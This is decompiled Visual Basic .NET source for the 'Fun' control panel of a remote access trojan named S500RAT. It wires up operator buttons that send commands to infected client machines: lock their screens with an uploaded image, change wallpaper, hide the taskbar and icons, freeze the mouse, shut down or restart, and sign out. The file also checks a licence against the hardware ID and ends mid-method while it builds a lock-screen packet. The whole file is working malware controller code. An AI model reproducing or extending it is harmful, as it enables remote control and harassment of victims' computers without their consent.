Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Drawing2D
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.My.Resources
Imports S500RAT.Server
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x0200001B RID: 27
	<DesignerGenerated()>
	Public Partial Class FormFun
		Inherits Form

		' Token: 0x0600035B RID: 859 RVA: 0x0001CBE1 File Offset: 0x0001ADE1
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FormFun_Load
			AddHandler MyBase.Resize, AddressOf Me.FormFun_Resize
			Me.FormSize = False
			Me.InitializeComponent()
		End Sub

		' Token: 0x17000162 RID: 354
		' (get) Token: 0x0600035E RID: 862 RVA: 0x000200B7 File Offset: 0x0001E2B7
		' (set) Token: 0x0600035F RID: 863 RVA: 0x000200C4 File Offset: 0x0001E2C4
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000163 RID: 355
		' (get) Token: 0x06000360 RID: 864 RVA: 0x00020107 File Offset: 0x0001E307
		' (set) Token: 0x06000361 RID: 865 RVA: 0x00020111 File Offset: 0x0001E311
		Friend Overridable Property UiLabel1 As UILabel

		' Token: 0x17000164 RID: 356
		' (get) Token: 0x06000362 RID: 866 RVA: 0x0002011A File Offset: 0x0001E31A
		' (set) Token: 0x06000363 RID: 867 RVA: 0x00020124 File Offset: 0x0001E324
		Private Overridable Property ClientInfo As Label

		' Token: 0x17000165 RID: 357
		' (get) Token: 0x06000364 RID: 868 RVA: 0x0002012D File Offset: 0x0001E32D
		' (set) Token: 0x06000365 RID: 869 RVA: 0x00020138 File Offset: 0x0001E338
		Friend Overridable Property IconShow As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._IconShow
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.IconShow_Click
				Dim iconShow As Guna2GradientButton = Me._IconShow
				If iconShow IsNot Nothing Then
					RemoveHandler iconShow.Click, value2
				End If
				Me._IconShow = value
				iconShow = Me._IconShow
				If iconShow IsNot Nothing Then
					AddHandler iconShow.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000166 RID: 358
		' (get) Token: 0x06000366 RID: 870 RVA: 0x0002017B File Offset: 0x0001E37B
		' (set) Token: 0x06000367 RID: 871 RVA: 0x00020185 File Offset: 0x0001E385
		Friend Overridable Property GroupBoxDataEncrypt As Guna2GroupBox

		' Token: 0x17000167 RID: 359
		' (get) Token: 0x06000368 RID: 872 RVA: 0x0002018E File Offset: 0x0001E38E
		' (set) Token: 0x06000369 RID: 873 RVA: 0x00020198 File Offset: 0x0001E398
		Friend Overridable Property IconHide As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._IconHide
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.IconHide_Click
				Dim iconHide As Guna2GradientButton = Me._IconHide
				If iconHide IsNot Nothing Then
					RemoveHandler iconHide.Click, value2
				End If
				Me._IconHide = value
				iconHide = Me._IconHide
				If iconHide IsNot Nothing Then
					AddHandler iconHide.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000168 RID: 360
		' (get) Token: 0x0600036A RID: 874 RVA: 0x000201DB File Offset: 0x0001E3DB
		' (set) Token: 0x0600036B RID: 875 RVA: 0x000201E5 File Offset: 0x0001E3E5
		Friend Overridable Property PictureBox13 As PictureBox

		' Token: 0x17000169 RID: 361
		' (get) Token: 0x0600036C RID: 876 RVA: 0x000201EE File Offset: 0x0001E3EE
		' (set) Token: 0x0600036D RID: 877 RVA: 0x000201F8 File Offset: 0x0001E3F8
		Friend Overridable Property ShowIconTaskBar As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._ShowIconTaskBar
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.ShowIconTaskBar_Click
				Dim showIconTaskBar As Guna2GradientButton = Me._ShowIconTaskBar
				If showIconTaskBar IsNot Nothing Then
					RemoveHandler showIconTaskBar.Click, value2
				End If
				Me._ShowIconTaskBar = value
				showIconTaskBar = Me._ShowIconTaskBar
				If showIconTaskBar IsNot Nothing Then
					AddHandler showIconTaskBar.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700016A RID: 362
		' (get) Token: 0x0600036E RID: 878 RVA: 0x0002023B File Offset: 0x0001E43B
		' (set) Token: 0x0600036F RID: 879 RVA: 0x00020248 File Offset: 0x0001E448
		Friend Overridable Property ClockShow As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._ClockShow
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.ClockShow_Click
				Dim clockShow As Guna2GradientButton = Me._ClockShow
				If clockShow IsNot Nothing Then
					RemoveHandler clockShow.Click, value2
				End If
				Me._ClockShow = value
				clockShow = Me._ClockShow
				If clockShow IsNot Nothing Then
					AddHandler clockShow.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700016B RID: 363
		' (get) Token: 0x06000370 RID: 880 RVA: 0x0002028B File Offset: 0x0001E48B
		' (set) Token: 0x06000371 RID: 881 RVA: 0x00020298 File Offset: 0x0001E498
		Friend Overridable Property IconTaskbar As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._IconTaskbar
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.IconTaskbar_Click
				Dim iconTaskbar As Guna2GradientButton = Me._IconTaskbar
				If iconTaskbar IsNot Nothing Then
					RemoveHandler iconTaskbar.Click, value2
				End If
				Me._IconTaskbar = value
				iconTaskbar = Me._IconTaskbar
				If iconTaskbar IsNot Nothing Then
					AddHandler iconTaskbar.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700016C RID: 364
		' (get) Token: 0x06000372 RID: 882 RVA: 0x000202DB File Offset: 0x0001E4DB
		' (set) Token: 0x06000373 RID: 883 RVA: 0x000202E8 File Offset: 0x0001E4E8
		Friend Overridable Property ClockHide As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._ClockHide
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.ClockHide_Click
				Dim clockHide As Guna2GradientButton = Me._ClockHide
				If clockHide IsNot Nothing Then
					RemoveHandler clockHide.Click, value2
				End If
				Me._ClockHide = value
				clockHide = Me._ClockHide
				If clockHide IsNot Nothing Then
					AddHandler clockHide.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700016D RID: 365
		' (get) Token: 0x06000374 RID: 884 RVA: 0x0002032B File Offset: 0x0001E52B
		' (set) Token: 0x06000375 RID: 885 RVA: 0x00020338 File Offset: 0x0001E538
		Friend Overridable Property SignOut As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._SignOut
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.SignOut_Click
				Dim signOut As Guna2GradientButton = Me._SignOut
				If signOut IsNot Nothing Then
					RemoveHandler signOut.Click, value2
				End If
				Me._SignOut = value
				signOut = Me._SignOut
				If signOut IsNot Nothing Then
					AddHandler signOut.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700016E RID: 366
		' (get) Token: 0x06000376 RID: 886 RVA: 0x0002037B File Offset: 0x0001E57B
		' (set) Token: 0x06000377 RID: 887 RVA: 0x00020388 File Offset: 0x0001E588
		Friend Overridable Property Restart As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._Restart
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.Restart_Click
				Dim restart As Guna2GradientButton = Me._Restart
				If restart IsNot Nothing Then
					RemoveHandler restart.Click, value2
				End If
				Me._Restart = value
				restart = Me._Restart
				If restart IsNot Nothing Then
					AddHandler restart.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700016F RID: 367
		' (get) Token: 0x06000378 RID: 888 RVA: 0x000203CB File Offset: 0x0001E5CB
		' (set) Token: 0x06000379 RID: 889 RVA: 0x000203D8 File Offset: 0x0001E5D8
		Friend Overridable Property ShutDown As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._ShutDown
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.ShutDown_Click
				Dim shutDown As Guna2GradientButton = Me._ShutDown
				If shutDown IsNot Nothing Then
					RemoveHandler shutDown.Click, value2
				End If
				Me._ShutDown = value
				shutDown = Me._ShutDown
				If shutDown IsNot Nothing Then
					AddHandler shutDown.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000170 RID: 368
		' (get) Token: 0x0600037A RID: 890 RVA: 0x0002041B File Offset: 0x0001E61B
		' (set) Token: 0x0600037B RID: 891 RVA: 0x00020428 File Offset: 0x0001E628
		Friend Overridable Property TextBox1Background As Guna2TextBox
			<CompilerGenerated()>
			Get
				Return Me._TextBox1Background
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TextBox)
				Dim value2 As EventHandler = AddressOf Me.TextBox1Background_IconRightClick
				Dim textBox1Background As Guna2TextBox = Me._TextBox1Background
				If textBox1Background IsNot Nothing Then
					RemoveHandler textBox1Background.IconRightClick, value2
				End If
				Me._TextBox1Background = value
				textBox1Background = Me._TextBox1Background
				If textBox1Background IsNot Nothing Then
					AddHandler textBox1Background.IconRightClick, value2
				End If
			End Set
		End Property

		' Token: 0x17000171 RID: 369
		' (get) Token: 0x0600037C RID: 892 RVA: 0x0002046B File Offset: 0x0001E66B
		' (set) Token: 0x0600037D RID: 893 RVA: 0x00020475 File Offset: 0x0001E675
		Friend Overridable Property PictureBox_Background As PictureBox

		' Token: 0x17000172 RID: 370
		' (get) Token: 0x0600037E RID: 894 RVA: 0x0002047E File Offset: 0x0001E67E
		' (set) Token: 0x0600037F RID: 895 RVA: 0x00020488 File Offset: 0x0001E688
		Friend Overridable Property DesktopBackground As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._DesktopBackground
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.DesktopBackground_Click
				Dim desktopBackground As Guna2GradientButton = Me._DesktopBackground
				If desktopBackground IsNot Nothing Then
					RemoveHandler desktopBackground.Click, value2
				End If
				Me._DesktopBackground = value
				desktopBackground = Me._DesktopBackground
				If desktopBackground IsNot Nothing Then
					AddHandler desktopBackground.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000173 RID: 371
		' (get) Token: 0x06000380 RID: 896 RVA: 0x000204CB File Offset: 0x0001E6CB
		' (set) Token: 0x06000381 RID: 897 RVA: 0x000204D8 File Offset: 0x0001E6D8
		Friend Overridable Property Web As Guna2TextBox
			<CompilerGenerated()>
			Get
				Return Me._Web
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TextBox)
				Dim value2 As EventHandler = AddressOf Me.Web_IconRightClick
				Dim web As Guna2TextBox = Me._Web
				If web IsNot Nothing Then
					RemoveHandler web.IconRightClick, value2
				End If
				Me._Web = value
				web = Me._Web
				If web IsNot Nothing Then
					AddHandler web.IconRightClick, value2
				End If
			End Set
		End Property

		' Token: 0x17000174 RID: 372
		' (get) Token: 0x06000382 RID: 898 RVA: 0x0002051B File Offset: 0x0001E71B
		' (set) Token: 0x06000383 RID: 899 RVA: 0x00020528 File Offset: 0x0001E728
		Friend Overridable Property TaskBarShow As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._TaskBarShow
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.TaskBarShow_Click_1
				Dim taskBarShow As Guna2GradientButton = Me._TaskBarShow
				If taskBarShow IsNot Nothing Then
					RemoveHandler taskBarShow.Click, value2
				End If
				Me._TaskBarShow = value
				taskBarShow = Me._TaskBarShow
				If taskBarShow IsNot Nothing Then
					AddHandler taskBarShow.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000175 RID: 373
		' (get) Token: 0x06000384 RID: 900 RVA: 0x0002056B File Offset: 0x0001E76B
		' (set) Token: 0x06000385 RID: 901 RVA: 0x00020578 File Offset: 0x0001E778
		Friend Overridable Property TaskBaerHide As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._TaskBaerHide
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.TaskBaerHide_Click
				Dim taskBaerHide As Guna2GradientButton = Me._TaskBaerHide
				If taskBaerHide IsNot Nothing Then
					RemoveHandler taskBaerHide.Click, value2
				End If
				Me._TaskBaerHide = value
				taskBaerHide = Me._TaskBaerHide
				If taskBaerHide IsNot Nothing Then
					AddHandler taskBaerHide.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000176 RID: 374
		' (get) Token: 0x06000386 RID: 902 RVA: 0x000205BB File Offset: 0x0001E7BB
		' (set) Token: 0x06000387 RID: 903 RVA: 0x000205C8 File Offset: 0x0001E7C8
		Friend Overridable Property MouseRestor As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._MouseRestor
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.MouseRestor_Click
				Dim mouseRestor As Guna2GradientButton = Me._MouseRestor
				If mouseRestor IsNot Nothing Then
					RemoveHandler mouseRestor.Click, value2
				End If
				Me._MouseRestor = value
				mouseRestor = Me._MouseRestor
				If mouseRestor IsNot Nothing Then
					AddHandler mouseRestor.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000177 RID: 375
		' (get) Token: 0x06000388 RID: 904 RVA: 0x0002060B File Offset: 0x0001E80B
		' (set) Token: 0x06000389 RID: 905 RVA: 0x00020618 File Offset: 0x0001E818
		Friend Overridable Property Mousestop As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._Mousestop
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.Mousestop_Click
				Dim mousestop As Guna2GradientButton = Me._Mousestop
				If mousestop IsNot Nothing Then
					RemoveHandler mousestop.Click, value2
				End If
				Me._Mousestop = value
				mousestop = Me._Mousestop
				If mousestop IsNot Nothing Then
					AddHandler mousestop.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000178 RID: 376
		' (get) Token: 0x0600038A RID: 906 RVA: 0x0002065B File Offset: 0x0001E85B
		' (set) Token: 0x0600038B RID: 907 RVA: 0x00020665 File Offset: 0x0001E865
		Friend Overridable Property ColorDialog1 As ColorDialog

		' Token: 0x17000179 RID: 377
		' (get) Token: 0x0600038C RID: 908 RVA: 0x0002066E File Offset: 0x0001E86E
		' (set) Token: 0x0600038D RID: 909 RVA: 0x00020678 File Offset: 0x0001E878
		Friend Overridable Property UnlockScreen As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._UnlockScreen
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.UnlockScreen_Click
				Dim unlockScreen As Guna2GradientButton = Me._UnlockScreen
				If unlockScreen IsNot Nothing Then
					RemoveHandler unlockScreen.Click, value2
				End If
				Me._UnlockScreen = value
				unlockScreen = Me._UnlockScreen
				If unlockScreen IsNot Nothing Then
					AddHandler unlockScreen.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700017A RID: 378
		' (get) Token: 0x0600038E RID: 910 RVA: 0x000206BB File Offset: 0x0001E8BB
		' (set) Token: 0x0600038F RID: 911 RVA: 0x000206C8 File Offset: 0x0001E8C8
		Friend Overridable Property LockScreen As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._LockScreen
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.LockScreen_Click
				Dim lockScreen As Guna2GradientButton = Me._LockScreen
				If lockScreen IsNot Nothing Then
					RemoveHandler lockScreen.Click, value2
				End If
				Me._LockScreen = value
				lockScreen = Me._LockScreen
				If lockScreen IsNot Nothing Then
					AddHandler lockScreen.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700017B RID: 379
		' (get) Token: 0x06000390 RID: 912 RVA: 0x0002070B File Offset: 0x0001E90B
		' (set) Token: 0x06000391 RID: 913 RVA: 0x00020715 File Offset: 0x0001E915
		Friend Overridable Property Guna2GroupBox1 As Guna2GroupBox

		' Token: 0x1700017C RID: 380
		' (get) Token: 0x06000392 RID: 914 RVA: 0x0002071E File Offset: 0x0001E91E
		' (set) Token: 0x06000393 RID: 915 RVA: 0x00020728 File Offset: 0x0001E928
		Friend Overridable Property Label1 As Label

		' Token: 0x1700017D RID: 381
		' (get) Token: 0x06000394 RID: 916 RVA: 0x00020731 File Offset: 0x0001E931
		' (set) Token: 0x06000395 RID: 917 RVA: 0x0002073B File Offset: 0x0001E93B
		Friend Overridable Property PictureBox1 As PictureBox

		' Token: 0x1700017E RID: 382
		' (get) Token: 0x06000396 RID: 918 RVA: 0x00020744 File Offset: 0x0001E944
		' (set) Token: 0x06000397 RID: 919 RVA: 0x0002074E File Offset: 0x0001E94E
		Friend Overridable Property Guna2GroupBox8 As Guna2GroupBox

		' Token: 0x1700017F RID: 383
		' (get) Token: 0x06000398 RID: 920 RVA: 0x00020757 File Offset: 0x0001E957
		' (set) Token: 0x06000399 RID: 921 RVA: 0x00020761 File Offset: 0x0001E961
		Friend Overridable Property PictureBox7 As PictureBox

		' Token: 0x17000180 RID: 384
		' (get) Token: 0x0600039A RID: 922 RVA: 0x0002076A File Offset: 0x0001E96A
		' (set) Token: 0x0600039B RID: 923 RVA: 0x00020774 File Offset: 0x0001E974
		Friend Overridable Property Guna2GroupBox6 As Guna2GroupBox

		' Token: 0x17000181 RID: 385
		' (get) Token: 0x0600039C RID: 924 RVA: 0x0002077D File Offset: 0x0001E97D
		' (set) Token: 0x0600039D RID: 925 RVA: 0x00020788 File Offset: 0x0001E988
		Friend Overridable Property Audio As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._Audio
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.Audio_Click
				Dim audio As Guna2GradientButton = Me._Audio
				If audio IsNot Nothing Then
					RemoveHandler audio.Click, value2
				End If
				Me._Audio = value
				audio = Me._Audio
				If audio IsNot Nothing Then
					AddHandler audio.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000182 RID: 386
		' (get) Token: 0x0600039E RID: 926 RVA: 0x000207CB File Offset: 0x0001E9CB
		' (set) Token: 0x0600039F RID: 927 RVA: 0x000207D5 File Offset: 0x0001E9D5
		Friend Overridable Property PictureBox6 As PictureBox

		' Token: 0x17000183 RID: 387
		' (get) Token: 0x060003A0 RID: 928 RVA: 0x000207DE File Offset: 0x0001E9DE
		' (set) Token: 0x060003A1 RID: 929 RVA: 0x000207E8 File Offset: 0x0001E9E8
		Friend Overridable Property Guna2GroupBox5 As Guna2GroupBox

		' Token: 0x17000184 RID: 388
		' (get) Token: 0x060003A2 RID: 930 RVA: 0x000207F1 File Offset: 0x0001E9F1
		' (set) Token: 0x060003A3 RID: 931 RVA: 0x000207FC File Offset: 0x0001E9FC
		Friend Overridable Property Monitor As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._Monitor
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.Monitor_Click
				Dim monitor As Guna2GradientButton = Me._Monitor
				If monitor IsNot Nothing Then
					RemoveHandler monitor.Click, value2
				End If
				Me._Monitor = value
				monitor = Me._Monitor
				If monitor IsNot Nothing Then
					AddHandler monitor.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000185 RID: 389
		' (get) Token: 0x060003A4 RID: 932 RVA: 0x0002083F File Offset: 0x0001EA3F
		' (set) Token: 0x060003A5 RID: 933 RVA: 0x00020849 File Offset: 0x0001EA49
		Friend Overridable Property PictureBox5 As PictureBox

		' Token: 0x17000186 RID: 390
		' (get) Token: 0x060003A6 RID: 934 RVA: 0x00020852 File Offset: 0x0001EA52
		' (set) Token: 0x060003A7 RID: 935 RVA: 0x0002085C File Offset: 0x0001EA5C
		Friend Overridable Property Guna2GroupBox3 As Guna2GroupBox

		' Token: 0x17000187 RID: 391
		' (get) Token: 0x060003A8 RID: 936 RVA: 0x00020865 File Offset: 0x0001EA65
		' (set) Token: 0x060003A9 RID: 937 RVA: 0x0002086F File Offset: 0x0001EA6F
		Friend Overridable Property PictureBox4 As PictureBox

		' Token: 0x17000188 RID: 392
		' (get) Token: 0x060003AA RID: 938 RVA: 0x00020878 File Offset: 0x0001EA78
		' (set) Token: 0x060003AB RID: 939 RVA: 0x00020882 File Offset: 0x0001EA82
		Friend Overridable Property Guna2Elipse2 As Guna2Elipse

		' Token: 0x17000189 RID: 393
		' (get) Token: 0x060003AC RID: 940 RVA: 0x0002088B File Offset: 0x0001EA8B
		' (set) Token: 0x060003AD RID: 941 RVA: 0x00020895 File Offset: 0x0001EA95
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x1700018A RID: 394
		' (get) Token: 0x060003AE RID: 942 RVA: 0x0002089E File Offset: 0x0001EA9E
		' (set) Token: 0x060003AF RID: 943 RVA: 0x000208A8 File Offset: 0x0001EAA8
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700018B RID: 395
		' (get) Token: 0x060003B0 RID: 944 RVA: 0x000208EB File Offset: 0x0001EAEB
		' (set) Token: 0x060003B1 RID: 945 RVA: 0x000208F5 File Offset: 0x0001EAF5
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x1700018C RID: 396
		' (get) Token: 0x060003B2 RID: 946 RVA: 0x000208FE File Offset: 0x0001EAFE
		' (set) Token: 0x060003B3 RID: 947 RVA: 0x00020908 File Offset: 0x0001EB08
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x1700018D RID: 397
		' (get) Token: 0x060003B4 RID: 948 RVA: 0x00020911 File Offset: 0x0001EB11
		' (set) Token: 0x060003B5 RID: 949 RVA: 0x0002091B File Offset: 0x0001EB1B
		Public Property Client As Clients

		' Token: 0x1700018E RID: 398
		' (get) Token: 0x060003B6 RID: 950 RVA: 0x00020924 File Offset: 0x0001EB24
		' (set) Token: 0x060003B7 RID: 951 RVA: 0x0002092E File Offset: 0x0001EB2E
		Public Property F As FormS500

		' Token: 0x1700018F RID: 399
		' (get) Token: 0x060003B8 RID: 952 RVA: 0x00020937 File Offset: 0x0001EB37
		' (set) Token: 0x060003B9 RID: 953 RVA: 0x00020941 File Offset: 0x0001EB41
		Public Property FullPath As String

		' Token: 0x17000190 RID: 400
		' (get) Token: 0x060003BA RID: 954 RVA: 0x0002094A File Offset: 0x0001EB4A
		' (set) Token: 0x060003BB RID: 955 RVA: 0x00020954 File Offset: 0x0001EB54
		Friend Property ParentClient As Clients

		' Token: 0x060003BC RID: 956 RVA: 0x00020960 File Offset: 0x0001EB60
		Private Sub FormFun_Load(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(APIH.GetHWID(Conversions.ToString(FormSC.GetPicpass())), FormSC.GetPickey(), False)))
				If flag Then
					MyBase.Close()
				End If
				Dim flag2 As Boolean = Operators.ConditionalCompareObjectEqual(APIH.GetHWID(Conversions.ToString(FormSC.GetPicpass())), FormSC.GetPickey(), False)
				If flag2 Then
					Setting.Running = True
				Else
					MyBase.Close()
				End If
				Dim flag3 As Boolean = Not Setting.Running
				If flag3 Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
			Dim expression As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(DataB.InfoClient(Me.ParentClient.L)))
			Try
				Me.ClientInfo.Text = String.Concat(New String() { Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(1), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(3), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(4) })
			Catch ex2 As Exception
				Me.ClientInfo.Text = "Not found !"
			End Try
			Me.FormSize = True
			Me.MinimumSize = MyBase.Size
			Me.MaximumSize = MyBase.Size
		End Sub

		' Token: 0x060003BD RID: 957 RVA: 0x00020AEC File Offset: 0x0001ECEC
		Private Sub FormFun_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x060003BE RID: 958 RVA: 0x00020B80 File Offset: 0x0001ED80
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Me.ParentClient.TcpClient.Connected OrElse Not Me.Client.TcpClient.Connected
				If flag Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
		End Sub

		' Token: 0x060003BF RID: 959 RVA: 0x00020BEC File Offset: 0x0001EDEC
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			ThreadPool.QueueUserWorkItem(Sub(o As Object)
				Dim client As Clients = Me.Client
				If client IsNot Nothing Then
					client.Disconnected()
				End If
				MyBase.Close()
			End Sub)
		End Sub

		' Token: 0x060003C0 RID: 960 RVA: 0x00020C04 File Offset: 0x0001EE04
		Private Sub TextBox1Background_IconRightClick(sender As Object, e As EventArgs)
			Try
				Using openFileDialog As OpenFileDialog = New OpenFileDialog()
					openFileDialog.Title = "S 500 RAT | Fun"
					openFileDialog.Filter = "File (*.jpg)|*.jpg|File (*.jpeg)|*.jpeg|File (*.gif)|*.gif|File (*.png)|*.png|File (*.bmp)|*.bmp|All Files (*.*)|*.*"
					openFileDialog.Multiselect = False
					Dim flag As Boolean = openFileDialog.ShowDialog() = DialogResult.OK
					If flag Then
						Me.HackedImg = File.ReadAllBytes(openFileDialog.FileName)
						Me.TextBox1Background.Text = openFileDialog.FileName
						Me.PictureBox_Background.Image = Image.FromFile(openFileDialog.FileName)
					Else
						Me.TextBox1Background.Text = ""
						Me.PictureBox_Background.Image = Nothing
						Me.HackedImg = Nothing
					End If
				End Using
			Catch ex As Exception
				MessageBox.Show(ex.Message, "Fun!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
			End Try
		End Sub

		' Token: 0x060003C1 RID: 961 RVA: 0x00020CFC File Offset: 0x0001EEFC
		Private Sub LockScreen_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.HackedImg.Length = 0
			If flag Then
				MessageBox.Show("Please add a lock screen wallpaper", "Fun!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
			Else
				Try
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").AsString = "LockScreen"
